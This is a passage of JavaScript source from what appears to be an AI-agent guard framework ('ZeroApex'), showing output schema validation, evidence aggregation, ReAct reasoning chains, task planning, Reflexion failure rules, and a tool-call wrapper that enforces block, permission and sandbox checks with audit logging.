            if (!schema || typeof schema !== "object") return { valid: true, errors: [] };
            var errors = [];
            var keys = Object.keys(schema);
            for (var i = 0; i < keys.length; i++) {
                var key = keys[i];
                var rule = schema[key];
                var val = data && data[key];
                var missing = val === undefined || val === null;

                if (rule.required && missing) {
                    errors.push({ field: key, error: "必填字段缺失" });
                    continue;
                }
                if (missing) continue;  // optional, not present — ok

                // type check
                var typeOk = rule.type ? (TYPES[rule.type] ? TYPES[rule.type](val) : true) : true;
                if (!typeOk) { errors.push({ field: key, error: "类型错误，期望 " + rule.type + "，实际 " + typeof val }); continue; }

                // numeric range
                if (rule.type === "number") {
                    if (rule.min !== undefined && val < rule.min) errors.push({ field: key, error: "值 " + val + " 小于最小值 " + rule.min });
                    if (rule.max !== undefined && val > rule.max) errors.push({ field: key, error: "值 " + val + " 大于最大值 " + rule.max });
                }
                // string constraints
                if (rule.type === "string") {
                    if (rule.minLen !== undefined && val.length < rule.minLen) errors.push({ field: key, error: "字符串长度 " + val.length + " 小于 minLen " + rule.minLen });
                    if (rule.maxLen !== undefined && val.length > rule.maxLen) errors.push({ field: key, error: "字符串长度 " + val.length + " 超过 maxLen " + rule.maxLen });
                    if (rule.pattern && !(new RegExp(rule.pattern)).test(val)) errors.push({ field: key, error: "字段 " + key + " 不匹配 pattern " + rule.pattern });
                }
                // enum check
                if (rule.enum && Array.isArray(rule.enum) && rule.enum.indexOf(val) < 0) {
                    errors.push({ field: key, error: "值 '" + val + "' 不在允许列表: " + rule.enum.join(", ") });
                }
                // array item type
                if (rule.type === "array" && rule.items && val.length > 0) {
                    var itemChecker = TYPES[rule.items];
                    if (itemChecker) {
                        for (var j = 0; j < val.length; j++) {
                            if (!itemChecker(val[j])) {
                                errors.push({ field: key + "[" + j + "]", error: "数组元素类型错误，期望 " + rule.items });
                                break;
                            }
                        }
                    }
                }
            }
            return { valid: errors.length === 0, errors: errors };
        }

        // Coerce data to match schema where safely possible (type coercion)
        function coerce(data, schema) {
            if (!schema || !data) return data;
            var out = Object.assign({}, data);
            var keys = Object.keys(schema);
            for (var i = 0; i < keys.length; i++) {
                var key = keys[i];
                var rule = schema[key];
                if (out[key] === undefined || out[key] === null) continue;
                if (rule.type === "string" && typeof out[key] !== "string") out[key] = String(out[key]);
                if (rule.type === "number" && typeof out[key] !== "number") {
                    var n = Number(out[key]);
                    if (isFinite(n)) out[key] = n;
                }
                if (rule.type === "boolean" && typeof out[key] !== "boolean") out[key] = !!out[key];
            }
            return out;
        }

        // Built-in schemas for ZeroApex tool responses
        var SCHEMAS = {
            preflight_result: {
                allowed: { type: "boolean", required: true },
                state: { type: "string", required: true, enum: ["READY", "NEED_EVIDENCE", "NOT_READY", "WAIT_CONFIRMATION"] },
                task_id: { type: "string", required: false },
                readiness_score: { type: "number", required: false, min: 0, max: 100 },
            },
            file_guard_result: {
                is_delete: { type: "boolean", required: true },
                requires_confirmation: { type: "boolean", required: true },
                risk_level: { type: "string", required: true, enum: ["SAFE", "LOW", "MEDIUM", "HIGH", "CRITICAL"] },
                success: { type: "boolean", required: true },
            },
            evidence_result: {
                grade: { type: "string", required: true },
                level: { type: "number", required: true, min: 0, max: 6 },
                verdict: { type: "string", required: true },
            },
        };

        function getSchema(name) { return SCHEMAS[name] || null; }
        function registerSchema(name, schema) { SCHEMAS[name] = schema; }

        return { validate: validate, coerce: coerce, getSchema: getSchema, registerSchema: registerSchema };
    })();

    // ======================================================================
    // §21g3 EvidenceCollector — cross-step evidence aggregation
    // Inspired by: LangSmith Tracing, OpenTelemetry for LLM pipelines
    // Core idea: accumulate evidence from multiple tool calls across a task
    // so the final preflight check has a complete evidence chain rather than
    // just the most recent stdout/stderr snippet.
    // ======================================================================
    var EvidenceCollector = (function () {
        var MAX_ENTRIES = 50;

        function create(taskId) {
            return {
                task_id: taskId || null,
                entries: [],
                created_at: new Date().toISOString(),
            };
        }

        // Add an evidence entry from a tool call result
        function add(collector, source, data) {
            if (!collector || collector.entries.length >= MAX_ENTRIES) return false;
            // Extract text from various result shapes
            var text = "";
            if (typeof data === "string") text = data;
            else if (data && typeof data.stdout === "string") text = data.stdout;
            else if (data && typeof data.output === "string") text = data.output;
            else if (data && typeof data.content === "string") text = data.content;
            else if (data && typeof data.message === "string") text = data.message;
            else if (data) text = JSON.stringify(data).slice(0, 500);

            var success = data && (data.success !== false) && !data.error;
            collector.entries.push({
                seq: collector.entries.length + 1,
                ts: new Date().toISOString(),
                source: String(source || ""),
                text: text.slice(0, 800),
                success: success,
                code: (data && data.code) || null,
            });
            return true;
        }

        // Build a consolidated evidence string for injection into preflight
        function consolidate(collector, maxLen) {
            maxLen = maxLen || 2000;
            if (!collector || collector.entries.length === 0) return "";
            var lines = [];
            for (var i = 0; i < collector.entries.length; i++) {
                var e = collector.entries[i];
                var status = e.success ? "OK" : "FAIL";
                lines.push("[" + e.seq + "] [" + status + "] " + e.source + ": " + e.text);
            }
            var joined = lines.join("\n");
            return joined.length > maxLen ? joined.slice(0, maxLen) + "\n…[truncated]" : joined;
        }

        // Compute aggregate success: true only if all entries succeeded
        function allSucceeded(collector) {
            if (!collector || collector.entries.length === 0) return false;
            for (var i = 0; i < collector.entries.length; i++) {
                if (!collector.entries[i].success) return false;
            }
            return true;
        }

        // Return the highest Evidence grade seen across all entries
        function bestGrade(collector) {
            if (!collector || collector.entries.length === 0) return "L0";
            var best = 0;
            var gradeRe = /\bL([0-6])\b/;
            for (var i = 0; i < collector.entries.length; i++) {
                var m = collector.entries[i].text.match(gradeRe);
                if (m) {
                    var lvl = parseInt(m[1], 10);
                    if (lvl > best) best = lvl;
                }
            }
            return "L" + best;
        }

        function snapshot(collector) { return collector ? collector.entries.slice() : []; }
        function clear(collector) { if (collector) collector.entries = []; }

        return { create: create, add: add, consolidate: consolidate, allSucceeded: allSucceeded, bestGrade: bestGrade, snapshot: snapshot, clear: clear };
    })();


    // Inspired by: Yao et al. "ReAct: Synergizing Reasoning and Acting" (2022)
    // Core idea: interleave reasoning traces with tool actions so each step
    // is grounded in observable evidence rather than pure language generation.
    // ======================================================================
    var ReasoningChain = (function () {
        var STEP_TYPES = Object.freeze({ THOUGHT: "thought", ACTION: "action", OBSERVATION: "observation", REFLECTION: "reflection" });
        var MAX_STEPS = 64;
        var _chainSeq = 0;  // F4: monotonic counter prevents same-millisecond ID collision

        function create(goal) {
            return {
                id: "RC" + (++_chainSeq) + "_" + new Date().toISOString().replace(/[^0-9]/g, "").slice(0, 14),
                goal: String(goal || ""),
                steps: [],
                created_at: new Date().toISOString(),
                status: "active",  // active | done | failed
                conclusion: null,
            };
        }

        function addStep(chain, type, content, meta) {
            if (!chain || chain.steps.length >= MAX_STEPS) return false;
            if (!STEP_TYPES[type.toUpperCase()]) return false;
            chain.steps.push({
                seq: chain.steps.length + 1,
                type: type,
                content: String(content || ""),
                ts: new Date().toISOString(),
                meta: meta || {},
            });
            return true;
        }

        function thought(chain, text) { return addStep(chain, STEP_TYPES.THOUGHT, text); }
        function action(chain, toolName, params) {
            return addStep(chain, STEP_TYPES.ACTION, toolName, { params: params || {} });
        }
        function observation(chain, result, success) {
            var content = typeof result === "string" ? result : JSON.stringify(result);
            // Principle-6 (verification closure): auto-detect if the observation
            // confirms a build/test/run result so downstream can require verified=true
            // before accepting a task as "done".
            var verified = false;
            if (success) {
                var lower = content.toLowerCase();
                verified = /build successful|tests? passed|all.*pass|exit.*code.*0|compiled.*ok|no errors?|0 error/.test(lower);
            }
            return addStep(chain, STEP_TYPES.OBSERVATION, content, { success: !!success, verified: verified });
        }
        function reflection(chain, text) { return addStep(chain, STEP_TYPES.REFLECTION, text); }

        function conclude(chain, conclusion, success) {
            chain.conclusion = String(conclusion || "");
            chain.status = success ? "done" : "failed";
            chain.completed_at = new Date().toISOString();
        }

        // Summarize the chain for injection into preflight context
        function summarize(chain) {
            if (!chain || chain.steps.length === 0) return "";
            var lines = ["[ReAct Chain] goal: " + chain.goal];
            for (var i = 0; i < chain.steps.length; i++) {
                var s = chain.steps[i];
                var prefix = s.seq + ". [" + s.type.toUpperCase() + "]";
                var body = s.content.length > 200 ? s.content.slice(0, 200) + "…" : s.content;
                lines.push(prefix + " " + body);
            }
            if (chain.conclusion) lines.push("[CONCLUSION] " + chain.conclusion);
            return lines.join("\n");
        }

        // Extract all observations with success=false (failed actions)
        function failedActions(chain) {
            var out = [];
            for (var i = 0; i < chain.steps.length; i++) {
                var s = chain.steps[i];
                if (s.type === STEP_TYPES.ACTION) {
                    // Look ahead for paired observation
                    if (i + 1 < chain.steps.length) {
                        var obs = chain.steps[i + 1];
                        if (obs.type === STEP_TYPES.OBSERVATION && obs.meta.success === false) {
                            out.push({ action: s.content, params: s.meta.params, observation: obs.content });
                        }
                    }
                }
            }
            return out;
        }

        // Build a compact evidence context from the latest N observations
        function latestEvidence(chain, n) {
            n = n || 3;
            var obs = [];
            for (var i = chain.steps.length - 1; i >= 0 && obs.length < n; i--) {
                if (chain.steps[i].type === STEP_TYPES.OBSERVATION) obs.unshift(chain.steps[i]);
            }
            return obs.map(function (o) { return o.content; }).join("\n---\n");
        }

        return { create: create, thought: thought, action: action, observation: observation, reflection: reflection, conclude: conclude, summarize: summarize, failedActions: failedActions, latestEvidence: latestEvidence, STEP_TYPES: STEP_TYPES };
    })();

    // ======================================================================
    // §21i TaskPlanner — hierarchical task decomposition
    // Inspired by: HuggingGPT (Shen et al. 2023), TaskWeaver (Microsoft 2023)
    // Core idea: decompose a complex goal into a dependency DAG of sub-tasks,
    // each with its own preflight + evidence requirements.
    // ======================================================================
    var TaskPlanner = (function () {
        var MAX_DEPTH = 6;
        var MAX_NODES = 128;
        var nodeSeq = 0;
        var DEFAULT_TIMEOUT_MS = 5 * 60 * 1000;  // F5: 5 min default node timeout

        function createPlan(goal, options) {
            options = options || {};
            return {
                goal: String(goal || ""),
                nodes: {},       // id -> node
                roots: [],       // top-level node ids
                created_at: new Date().toISOString(),
                status: "pending",
                timeout_ms: options.timeout_ms || DEFAULT_TIMEOUT_MS,
            };
        }

        function addTask(plan, parentId, task) {
            if (Object.keys(plan.nodes).length >= MAX_NODES) return null;
            var depth = 0;
            var p = parentId;
            while (p && plan.nodes[p]) { depth++; p = plan.nodes[p].parentId; }
            if (depth >= MAX_DEPTH) return null;

            var id = "N" + (++nodeSeq) + "_" + (task.name || "task").replace(/\s+/g, "_").slice(0, 20);
            plan.nodes[id] = {
                id: id,
                parentId: parentId || null,
                name: String(task.name || ""),
                goal: String(task.goal || task.name || ""),
                tool: task.tool || null,       // optional: bound tool name
                params: task.params || {},
                requires: task.requires || [],  // ids of prerequisite nodes
                status: "pending",             // pending|running|done|failed|skipped
                result: null,
                chain: null,                   // ReasoningChain for this node
                priority: task.priority || 0,
            };
            if (!parentId) plan.roots.push(id);
            else {
                var parent = plan.nodes[parentId];
                if (parent) {
                    parent.children = parent.children || [];
                    parent.children.push(id);
                }
            }
            return id;
        }

        // Returns nodes whose prerequisites are all done and status is pending
        function readyNodes(plan) {
            var ready = [];
            var now = Date.now();
            var timeoutMs = plan.timeout_ms || DEFAULT_TIMEOUT_MS;
            var ids = Object.keys(plan.nodes);
            // F5: auto-fail timed-out running nodes before checking ready ones
            for (var ti = 0; ti < ids.length; ti++) {
                var tn = plan.nodes[ids[ti]];
                if (tn.status === "running" && tn.started_at) {
                    var elapsed = now - new Date(tn.started_at).getTime();
                    if (elapsed > (tn.timeout_ms || timeoutMs)) {
                        tn.status = "failed";
                        tn.result = { error: "timeout after " + Math.round(elapsed / 1000) + "s" };
                        tn.completed_at = new Date().toISOString();
                        _skipDescendants(plan, tn.id);
                        _updatePlanStatus(plan);
                    }
                }
            }
            for (var i = 0; i < ids.length; i++) {
                var node = plan.nodes[ids[i]];
                if (node.status !== "pending") continue;
                var reqs = node.requires || [];
                var allDone = true;
                for (var j = 0; j < reqs.length; j++) {
                    var dep = plan.nodes[reqs[j]];
                    if (!dep || dep.status !== "done") { allDone = false; break; }
                }
                if (allDone) ready.push(node);
            }
            // Sort by priority descending
            ready.sort(function (a, b) { return (b.priority || 0) - (a.priority || 0); });
            return ready;
        }

        // F5: mark a node as running and record start time for timeout tracking
        function startNode(plan, nodeId) {
            var node = plan.nodes[nodeId];
            if (!node || node.status !== "pending") return false;
            node.status = "running";
            node.started_at = new Date().toISOString();
            return true;
        }

        function completeNode(plan, nodeId, result, success) {
            var node = plan.nodes[nodeId];
            if (!node) return false;
            node.status = success ? "done" : "failed";
            node.result = result;
            node.completed_at = new Date().toISOString();
            // Propagate failure: skip all descendants of a failed node
            if (!success) _skipDescendants(plan, nodeId);
            // Check overall plan status
            _updatePlanStatus(plan);
            return true;
        }

        function _skipDescendants(plan, nodeId) {
            var node = plan.nodes[nodeId];
            if (!node || !node.children) return;
            for (var i = 0; i < node.children.length; i++) {
                var child = plan.nodes[node.children[i]];
                if (child && child.status === "pending") {
                    child.status = "skipped";
                    _skipDescendants(plan, child.id);
                }
            }
        }

        function _updatePlanStatus(plan) {
            var ids = Object.keys(plan.nodes);
            var allDone = true;
            var anyFailed = false;
            for (var i = 0; i < ids.length; i++) {
                var s = plan.nodes[ids[i]].status;
                if (s === "pending" || s === "running") { allDone = false; }
                if (s === "failed") anyFailed = true;
            }
            if (allDone) plan.status = anyFailed ? "failed" : "done";
        }

        // Flatten plan to ordered execution list (topological sort)
        function topoSort(plan) {
            var visited = {};
            var order = [];
            function visit(id) {
                if (visited[id]) return;
                visited[id] = true;
                var node = plan.nodes[id];
                if (!node) return;
                var reqs = node.requires || [];
                for (var i = 0; i < reqs.length; i++) visit(reqs[i]);
                order.push(node);
            }
            var ids = Object.keys(plan.nodes);
            for (var i = 0; i < ids.length; i++) visit(ids[i]);
            return order;
        }

        function summary(plan) {
            var lines = ["[Plan] " + plan.goal + " (" + plan.status + ")"];
            var ordered = topoSort(plan);
            for (var i = 0; i < ordered.length; i++) {
                var n = ordered[i];
                var indent = "";
                var p = n.parentId;
                while (p) { indent += "  "; p = plan.nodes[p] && plan.nodes[p].parentId; }
                lines.push(indent + "- [" + n.status.toUpperCase() + "] " + n.name + (n.tool ? " (" + n.tool + ")" : ""));
            }
            return lines.join("\n");
        }

        return { createPlan: createPlan, addTask: addTask, startNode: startNode, readyNodes: readyNodes, completeNode: completeNode, topoSort: topoSort, summary: summary };
    })();

    // ======================================================================
    // §21j Reflexion — failure reflection and rule extraction
    // Inspired by: Shinn et al. "Reflexion" (2023), Self-Refine (Madaan 2023)
    // Core idea: after a failure, generate a structured reflection that is
    // stored in memory and injected into subsequent preflight context,
    // preventing the same mistake from recurring.
    // ======================================================================
    var Reflexion = (function () {
        var MAX_REFLECTIONS = 200;
        var SEVERITY = Object.freeze({ LOW: "low", MEDIUM: "medium", HIGH: "high", CRITICAL: "critical" });
        var store = [];  // in-memory; persisted via Memory module when available

        function reflect(failure) {
            // failure: { goal, tool, error, evidence, chain_summary }
            if (store.length >= MAX_REFLECTIONS) store.shift();  // rolling window
            var entry = {
                id: "R" + Date.now() + "_" + Math.floor(Math.random() * 1000),
                ts: new Date().toISOString(),
                goal: String(failure.goal || ""),
                tool: String(failure.tool || ""),
                error: String(failure.error || ""),
                evidence: String(failure.evidence || ""),
                chain_summary: String(failure.chain_summary || ""),
                severity: failure.severity || SEVERITY.MEDIUM,
                rule: _extractRule(failure),
                applied_count: 0,
            };
            store.push(entry);
            return entry;
        }

        // Derive a short actionable rule from the failure
        function _extractRule(failure) {
            var err = String(failure.error || "").toLowerCase();
            var tool = String(failure.tool || "");
            // Pattern-based rule extraction — mirrors common agent failure modes
            // Each entry: { rule, root_cause, fallback_suggestion }
            var matched = null;
            if (/path.*traversal|\.\.\//.test(err))
                matched = { rule: "避免在路径中使用 '..' 遍历片段", root_cause: "path_traversal", fallback_suggestion: "使用绝对路径替代相对路径" };
            else if (/not found|no such file/.test(err))
                matched = { rule: "操作文件前先验证路径存在", root_cause: "missing_file", fallback_suggestion: "先调用 file_guard 检查路径后再操作" };
            else if (/permission|forbidden|denied/.test(err))
                matched = { rule: "检查权限级别后再调用 " + (tool || "工具"), root_cause: "permission_denied", fallback_suggestion: "调用 evaluate_permission 确认所需权限级别" };
            else if (/timeout|timed out/.test(err))
                matched = { rule: "网络操作设置超时，失败后走缓存", root_cause: "timeout", fallback_suggestion: "减小请求体积或拆分为多次调用" };
            else if (/hallucin|unverified|guessed/.test(err))
                matched = { rule: "声明完成前必须提供 L3+ 证据", root_cause: "hallucination", fallback_suggestion: "先收集 evidence 再调用 hallucination_guard" };
            else if (/curtail|not available/.test(err))
                matched = { rule: "先查询 manifest 确认工具在当前环境可用", root_cause: "tool_curtailed", fallback_suggestion: "调用 check_sandbox 确认工具白名单" };
            else if (/memory|out of/.test(err))
                matched = { rule: "对大文件分批处理，避免单次读入", root_cause: "oom", fallback_suggestion: "使用 offset/limit 分段读取" };
            else if (/duplicate|repeat|already called/.test(err))
                matched = { rule: "避免重复调用同一工具，优先复用已有结果", root_cause: "repeat_call", fallback_suggestion: "检查 SelfMonitor 重复调用警告后再继续" };

            if (matched) {
                return matched.rule + " [root_cause=" + matched.root_cause + "; fallback=" + matched.fallback_suggestion + "]";
            }
            if (failure.goal && failure.goal.length > 0) {
                return "执行「" + failure.goal.slice(0, 40) + "」时避免重复错误：" + String(failure.error || "").slice(0, 60);
            }
            return "记录失败模式，下次同类任务前先验证前提条件";
        }

        // Find reflections relevant to a given goal/tool context
        function query(goal, tool, limit) {
            limit = limit || 5;
            var scored = [];
            for (var i = 0; i < store.length; i++) {
                var r = store[i];
                var score = 0;
                if (tool && r.tool === tool) score += 3;
                // Simple keyword overlap between goals
                var gWords = String(goal || "").split(/\s+/);
                for (var j = 0; j < gWords.length; j++) {
                    if (gWords[j].length > 2 && r.goal.indexOf(gWords[j]) >= 0) score += 1;
                }
                if (r.severity === SEVERITY.CRITICAL) score += 2;
                if (r.severity === SEVERITY.HIGH) score += 1;
                if (score > 0) scored.push({ entry: r, score: score });
            }
            scored.sort(function (a, b) { return b.score - a.score; });
            return scored.slice(0, limit).map(function (s) { return s.entry; });
        }

        // Format relevant reflections as a context hint for preflight
        function contextHint(goal, tool) {
            var relevant = query(goal, tool, 3);
            if (relevant.length === 0) return "";
            var lines = ["[过往反思 — 请避免重复以下错误]"];
            for (var i = 0; i < relevant.length; i++) {
                var r = relevant[i];
                r.applied_count++;
                lines.push("• [" + r.severity.toUpperCase() + "] " + r.rule);
                if (r.error) lines.push("  原因: " + r.error.slice(0, 80));
            }
            return lines.join("\n");
        }

        // Persist reflections to Memory module (async, fire-and-forget)
        // Accepts either ZeroApex.Memory (has remember()) or Tools.Memory (has create())
        async function persist(MemoryModule) {
            if (!MemoryModule) return;
            var recent = store.slice(-10);
            for (var i = 0; i < recent.length; i++) {
                var r = recent[i];
                try {
                    if (typeof MemoryModule.remember === "function") {
                        // ZeroApex.Memory API
                        await MemoryModule.remember(
                            "failure",
                            "[Reflexion] " + r.goal.slice(0, 40),
                            "规则: " + r.rule + "\n错误: " + r.error,
                            r.evidence || "",
                            "reflexion," + r.severity
                        );
                    } else if (typeof MemoryModule.create === "function") {
                        // Raw Tools.Memory API
                        await MemoryModule.create({
                            title: "[Reflexion] " + r.goal.slice(0, 40),
                            content: "规则: " + r.rule + "\n错误: " + r.error + "\n证据: " + r.evidence,
                            source: "zero_apex_reflexion",
                            folderPath: "reflexion",
                            tags: "reflexion," + r.severity + "," + r.tool,
                        });
                    }
                } catch (e) { /* non-fatal */ }
            }
        }

        function snapshot() { return store.slice(); }
        function clear() { store = []; }
        function size() { return store.length; }

        return { reflect: reflect, query: query, contextHint: contextHint, persist: persist, snapshot: snapshot, clear: clear, size: size, SEVERITY: SEVERITY };
    })();



    // ======================================================================
    function create(deps) {
        deps = deps || {};
        var Evidence = new EvidenceModule({ Files: deps.Files });
        var OpenSource = new OpenSourceModule({ Network: deps.Network });
        var Memory = new MemoryModule({ Tools: deps.Tools });
        var Snapshot = new SnapshotModule({ Files: deps.Files });
        var ledger = new TaskLedger(deps);
        var audit = new AuditLogger({ Files: deps.Files });
        var enforcer = new BlockEnforcer();
        var manifest = new ManifestLoader({ Files: deps.Files });
        // §21e-g: ShellGuard is module-static; SandboxProfile + PermissionRules
        var sandbox = new SandboxProfile({ manifest: manifest });
        var permissions = new PermissionRules({ manifest: manifest });

        // §13/§14: Wire Evidence into Hallucination so fact-claim verification
        // closes the "regex says yes but evidence says no" bypass.
        setEvidenceForHallucination(Evidence);

        async function preflight(goal, command, evidence, filesRead, options) {
            var result = await preflightGate({ ledger: ledger, permissions: permissions }, goal, command, evidence, filesRead, options);
            // #5: if preflight blocks, register hard block on task_id
            if (!result.allowed && result.task_id) {
                enforcer.block(result.task_id, result.state + ": " + (result.reasons || []).join("; "));
            }
            // #8: audit preflight call
            audit.append({
                tool: "preflight",
                task_id: result.task_id,
                trigger: goal,
                duration_ms: 0,
                result_code: result.allowed ? "ALLOW" : "BLOCK",
                result_summary: result.state,
            });
            return result;
        }

        // #5: check block before any tool execution
        function checkBlock(taskId) {
            if (enforcer.isBlocked(taskId)) {
                return {
                    success: false,
                    code: ErrorCode.GUARD_BLOCK,
                    error: "任务 " + taskId + " 已被 preflight 硬阻断，后续工具调用被拒绝",
                    blocked_by: "enforce_block",
                };
            }
            return null;
        }

        // #7: check tool allowed by env curtail
        function checkToolAllowed(toolName) {
            if (!manifest.isToolAllowed(toolName, deps)) {
                return {
                    success: false,
                    code: ErrorCode.DEPENDENCY_MISSING,
                    error: "工具 " + toolName + " 在当前环境权限下不可用",
                };
            }
            return null;
        }

        return {
            FileGuard: FileGuard,
            Hallucination: Hallucination,
            Evidence: Evidence,
            SelfMonitor: SelfMonitor,
            OutputFirewall: OutputFirewall,
            OpenSource: OpenSource,
            Memory: Memory,
            Snapshot: Snapshot,
            ReasoningChain: ReasoningChain,
            TaskPlanner: TaskPlanner,
            Reflexion: Reflexion,
            EvidenceCollector: EvidenceCollector,
            OutputValidator: OutputValidator,
            preflight: preflight,
            ledger: ledger,
            audit: audit,
            enforcer: enforcer,
            manifest: manifest,
            sandbox: sandbox,
            permissions: permissions,
            checkBlock: checkBlock,
            checkToolAllowed: checkToolAllowed,
            // Infrastructure exposed for testing / extension
            _infra: {
                ConfigRegistry: ConfigRegistry,
                PathUtils: PathUtils,
                RetryPolicy: RetryPolicy,
                ConcurrencyLimiter: ConcurrencyLimiter,
                FileLock: FileLock,
                LRUCache: LRUCache,
                TemplateStore: TemplateStore,
                OutputChunker: OutputChunker,
                TaskLedger: TaskLedger,
                ErrorCode: ErrorCode,
                AuditLogger: AuditLogger,
                BlockEnforcer: BlockEnforcer,
                ManifestLoader: ManifestLoader,
                ShellGuard: ShellGuard,
                SandboxProfile: SandboxProfile,
                PermissionRules: PermissionRules,
                ReasoningChain: ReasoningChain,
                TaskPlanner: TaskPlanner,
                Reflexion: Reflexion,
                OutputValidator: OutputValidator,
                EvidenceCollector: EvidenceCollector,
                GateRegistry: { register: registerGate, run: runGates, list: function () { var n = []; for (var i = 0; i < GateRegistry.length; i++) n.push(GateRegistry[i].name); return n; } },
            },
        };
    }

    // Default instance using ambient globals (QuickJS sandbox hooks).
    // These are resolved lazily so the module can be loaded for self-test
    // even when the sandbox has not yet provided the hooks.
    // Fallback chain: globalThis → global → window → QuickJS scriptArgs[0] context
    function ambient(name) {
        try {
            // Standard: globalThis (Node.js, modern QuickJS)
            if (typeof globalThis !== "undefined" && globalThis[name]) return globalThis[name];
            // CommonJS environments
            if (typeof global !== "undefined" && global[name]) return global[name];
            // Browser / older runtimes
            if (typeof window !== "undefined" && window[name]) return window[name];
            // QuickJS: top-level this in non-strict module context
            if (typeof this !== "undefined" && this !== null && this[name]) return this[name];
            return undefined;
        } catch (e) { return undefined; }
    }

    var defaultInstance = create({
        Files: ambient("Files"),
        Network: ambient("Network"),
        Tools: ambient("Tools"),
    });
    var defaultDeps = {
        Files: ambient("Files"),
        Network: ambient("Network"),
        Tools: ambient("Tools"),
    };
    var defaultEnforcer = defaultInstance.enforcer;
    var defaultAudit = defaultInstance.audit;
    var defaultManifest = defaultInstance.manifest;
    var defaultSandbox = defaultInstance.sandbox;
    var defaultPermissions = defaultInstance.permissions;

    function complete(taskId, result) {
        if (taskId && defaultInstance.ledger) {
            try {
                defaultInstance.ledger.complete(taskId, result);
                // Returns false if task not found or invalid transition — non-fatal,
                // task may live in the caller's own ledger instance
            } catch (e) {
                defaultAudit.append({ tool: "wrapToolExecution", task_id: taskId, trigger: "ledger_complete_error", duration_ms: 0, result_code: ErrorCode.INTERNAL_ERROR, result_summary: safeString(e).slice(0, 80) });
            }
        }
    }

    async function wrapToolExecution(func, params, toolName) {
        var startTs = Date.now();
        var p = params || {};
        var taskId = p.task_id || null;
        try {
            // Ensure the manifest is loaded before consulting it for curtailment.
            // Without this, the first tool call would see the builtin minimal
            // manifest and either incorrectly allow or incorrectly deny.
            if (defaultManifest && typeof defaultManifest.loadAsync === "function") {
                try { await defaultManifest.loadAsync(); } catch (e) {
                    // Non-fatal: log and continue with cached/builtin manifest
                    defaultAudit.append({ tool: toolName || "unknown", task_id: taskId, trigger: "manifest_load_error", duration_ms: 0, result_code: ErrorCode.INTERNAL_ERROR, result_summary: safeString(e).slice(0, 120) });
                }
            }
            if (taskId && defaultEnforcer.isBlocked(taskId)) {
                var blockResult = {
                    success: false,
                    code: "E4001_GUARD_BLOCK",
                    error: "任务 " + taskId + " 已被 preflight 硬阻断，后续工具调用被拒绝",
                    blocked_by: "enforce_block",
                };
                defaultAudit.append({ tool: toolName || "unknown", task_id: taskId, trigger: "blocked", duration_ms: Date.now() - startTs, result_code: "E4001_GUARD_BLOCK", result_summary: "enforce_block rejected" });
                defaultAudit.flush();
                complete(taskId, blockResult);
                return blockResult;
            }
            if (toolName && defaultManifest && !defaultManifest.isToolAllowed(toolName, defaultDeps)) {
                var curtResult = {
                    success: false,
                    code: ErrorCode.TOOL_CURTAILED,
                    error: errorMessage(ErrorCode.TOOL_CURTAILED, toolName),
                };
                defaultAudit.append({ tool: toolName, task_id: taskId, trigger: "curtailed", duration_ms: Date.now() - startTs, result_code: ErrorCode.TOOL_CURTAILED, result_summary: "env curtail rejected" });
                defaultAudit.flush();
                complete(taskId, curtResult);
                return curtResult;
            }
            if (defaultPermissions) {
                // Meta-tools (the authority) bypass permission checks
                // to avoid recursive self-blocking. The set is defined
                // ONCE in §0b and consumed here via isMetaTool().
                if (!isMetaTool(toolName)) {
                    var perm = defaultPermissions.evaluate(toolName, p);
                    if (perm.verdict === "DENY") {
                        var permDenyResult = { success: false, code: "E4001_GUARD_BLOCK", error: "Permission 规则拒绝: " + perm.reason, blocked_by: "permission:deny" };
                        defaultAudit.append({ tool: toolName || "unknown", task_id: taskId, trigger: "permission_deny", duration_ms: Date.now() - startTs, result_code: "E4001_GUARD_BLOCK", result_summary: perm.reason });
                        defaultAudit.flush();
                        complete(taskId, permDenyResult);
                        return permDenyResult;
                    }
                    if (perm.verdict === "ASK") {
                        var askResult = { success: false, code: "E4001_GUARD_BLOCK", error: "Permission 规则要求确认: " + perm.reason + "（无交互式 UI，按 deny 处理）", blocked_by: "permission:ask" };
                        defaultAudit.append({ tool: toolName || "unknown", task_id: taskId, trigger: "permission_ask", duration_ms: Date.now() - startTs, result_code: "E4001_GUARD_BLOCK", result_summary: perm.reason });
                        defaultAudit.flush();
                        complete(taskId, askResult);
                        return askResult;
                    }
                }
            }
            if (defaultSandbox) {
                var sandboxParams = null;
                // Meta-tools that evaluate other tools must not be sandboxed
                // (they are the authority, not the subject). Otherwise asking
                // "would this command be allowed?" triggers its own denial.
                // Single source of truth: §0b META_TOOLS / isMetaTool().
                if (toolName && !isMetaTool(toolName)) {
                    if (p.command) {
                        sandboxParams = { command: p.command };
                    } else if (p.path) {
                        sandboxParams = { path: p.path, action: "write" };
                    } else if (p.file_path) {
                        sandboxParams = { path: p.file_path, action: "write" };
                    }
                }
                if (sandboxParams) {
                    var sandboxResult = defaultSandbox.check(sandboxParams);
                    if (!sandboxResult.allowed) {
                        var sbDenyResult = { success: false, code: "E4001_GUARD_BLOCK", error: "Sandbox 拒绝: " + sandboxResult.reason, blocked_by: "sandbox:" + (sandboxParams.command ? "command" : "path") };
                        defaultAudit.append({ tool: toolName || "unknown", task_id: taskId, trigger: "sandbox_deny", duration_ms: Date.now() - startTs, result_code: "E4001_GUARD_BLOCK", result_summary: sandboxResult.reason });
                        defaultAudit.flush();
                        complete(taskId, sbDenyResult);
                        return sbDenyResult;
                    }
                }
            }
            var result = await func(p);
            defaultAudit.append({ tool: toolName || "unknown", task_id: taskId, trigger: p.trigger || null, duration_ms: Date.now() - startTs, result_code: (result && result.code) || (result && result.success ? "OK" : "UNKNOWN"), result_summary: result ? safeStr(result.error || result.state || (result.success ? "success" : "fail")) : null });
            defaultAudit.flush();
            complete(taskId, result);
            return result;
        } catch (error) {
            var errResult = { success: false, code: "E5001_INTERNAL_ERROR", error: "工具执行异常: " + (error && error.message ? error.message : String(error)) };
            defaultAudit.append({ tool: toolName || "unknown", task_id: taskId, trigger: "exception", duration_ms: Date.now() - startTs, result_code: "E5001_INTERNAL_ERROR", result_summary: safeStr(error) });
            defaultAudit.flush();
            complete(taskId, errResult);
            return errResult;
        }
    }

    // Tool functions that need IIFE-scoped default* variables
    async function enforce_block(params) {
        var taskId = params.task_id;
        if (!taskId) {
            return { success: false, code: "E1002_MISSING_REQUIRED", error: "task_id 为必填" };
        }
        var blocked = defaultEnforcer.isBlocked(taskId);
        return {
            success: true,
            code: "OK",
            task_id: taskId,
            is_blocked: blocked,
            action: blocked ? "BLOCK: 该任务已被 preflight 硬阻断，禁止执行后续工具调用" : "PASS",
        };
    }

    async function audit_log(params) {
